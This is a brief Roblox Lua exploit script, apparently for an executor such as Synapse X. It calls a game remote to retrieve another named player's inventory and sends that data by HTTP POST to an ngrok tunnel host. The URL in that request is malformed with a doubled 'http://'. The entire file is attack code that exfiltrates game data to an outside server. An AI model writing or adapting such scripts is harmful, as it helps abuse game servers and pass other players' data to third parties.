local Players = game:GetService("Players")
local player = Players["Anto_Crasher666"]
print(player)

local playerinv = game.ReplicatedStorage.remotes.getOtherPlayersInvy:InvokeServer(player)
print(playerinv)
if playerinv then
---@diagnostic disable-next-line: undefined-global
    local content = syn.request(
    {
        Url = "http://http://fb62-2403-6200-8956-4bc4-e06d-4ab3-157c-88ba.ngrok.io:6969/",  
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({inv = playerinv})
    }
)
end